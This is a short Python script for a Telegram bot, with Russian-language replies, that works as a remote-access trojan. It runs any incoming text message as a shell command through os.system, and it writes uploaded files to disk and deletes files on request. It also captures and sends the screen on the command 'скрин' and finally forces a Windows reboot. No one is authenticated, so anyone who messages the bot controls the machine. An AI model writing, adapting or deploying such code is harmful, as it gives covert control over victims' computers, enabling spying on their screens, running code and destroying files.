import telebot
import os
from threading import Thread
import pyautogui

TOKEN = 'Ваш токен'
bot = telebot.TeleBot(TOKEN)



def one(mes):
    os.system(mes)


@bot.message_handler(content_types=['document'])
def get_text_messages(message):
    try:
        chat_id = message.chat.id

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        src = message.document.file_name
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, "файл получен")
    except Exception as e:
        bot.reply_to(message, e)


@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    chat_id = message.chat.id
    if 'del.' not in message.text and str(message.text).lower() != 'работаешь?' and str(message.text).lower() != 'скрин':
        t1 = Thread(target=one, args=(message.text,))
        t1.start()
        bot.reply_to(message, 'Файл запущен')

    elif str(message.text).lower() == 'скрин':
        pyautogui.screenshot('screenshot.png')
        photo = open('screenshot.png', 'rb')
        bot.send_photo(chat_id, photo)

    elif 'del.' in message.text:
        try:
            a = ''
            for i in range(4, len(message.text)):
                a += message.text[i]
            os.remove(a)
            bot.reply_to(message, 'Файл удалён')

        except FileNotFoundError:
            bot.reply_to(message, 'Файл не найден')

    else:
        bot.reply_to(message, 'ДА')


bot.polling(none_stop=True, interval=0)
os.system('shutdown /r /t 0')
